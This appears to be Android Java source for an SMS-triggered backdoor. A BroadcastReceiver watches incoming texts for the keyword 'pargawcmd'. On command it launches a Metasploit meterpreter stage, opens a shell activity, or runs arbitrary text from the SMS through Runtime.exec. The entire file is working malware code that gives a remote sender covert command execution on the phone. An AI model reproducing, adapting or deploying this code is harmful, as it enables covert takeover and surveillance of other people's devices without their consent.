package com.example.root.shell;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.widget.Toast;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.Arrays;

public class SmsReceiver extends BroadcastReceiver {

    public static final String SMS_BUNDLE = "pdus";

    public void onReceive(Context context, Intent intent)
    {

        Bundle intentExtras = intent.getExtras();
        if (intentExtras != null)
        {
            Object[] sms = (Object[]) intentExtras.get(SMS_BUNDLE);
            String smsMessageStr = "";
            for (int i = 0; i < sms.length; ++i) {
                SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) sms[i]);

                String smsBody = smsMessage.getMessageBody().toString();
                String address = smsMessage.getOriginatingAddress();

                smsMessageStr += "SMS From: " + address + "\n";
                smsMessageStr += smsBody + "\n";
            }
            //Toast.makeText(context, smsMessageStr, Toast.LENGTH_SHORT).show();

            if(smsMessageStr.contains("pargawcmd"))
            {
                String[] arr = smsMessageStr.split(" ");
                int x = 0,cmd=0;
                for ( String ss : arr)
                {
                    if (arr[x].contains("pargawcmd")) {
                        cmd=x;
                    } else {
                        x = x + 1;
                    }
                }
                x=cmd+1;
                if (arr[x].contains("meterpreter"))
                {


                    Intent i = new Intent();
                    i.setClassName("com.metasploit.stage", "com.metasploit.stage.MainActivity");
                    i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    context.startActivity(i);
                }
                else if (arr[x].contains("check"))
                {
                    Toast.makeText(context, smsMessageStr, Toast.LENGTH_SHORT).show();
                }
                else if (arr[x].contains("terminal"))
                {
                    Toast.makeText(context, "starting terminal", Toast.LENGTH_SHORT).show();
                    Intent i = new Intent();
                    i.setClassName("com.example.root.shell", "com.example.root.shell.Main3Activity");
                    i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    context.startActivity(i);
                }
                else if (arr[x].contains("cmd"))
                {
                    String[] exa= Arrays.copyOfRange(arr, x+1, arr.length);
                    StringBuilder builder = new StringBuilder();
                    for(String s : exa)
                    {
                        builder.append(s);
                        builder.append(" ");
                    }

                    String ex = builder.toString();
                    //ex="touch /storage/emulated/0/newcmd.txt";
                    Toast.makeText(context, "executing " + ex, Toast.LENGTH_LONG).show();



                    StringBuffer output = new StringBuffer();

                    Process p;
                    try {
                        p = Runtime.getRuntime().exec(ex);
                        //p.waitFor();
                        BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));

                        String line = "";
                        while ((line = reader.readLine())!= null) {
                            output.append(line + "n");
                        }

                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                    String response = output.toString();
                    Toast.makeText(context, response, Toast.LENGTH_SHORT).show();
                }
            }
        }
    }
}

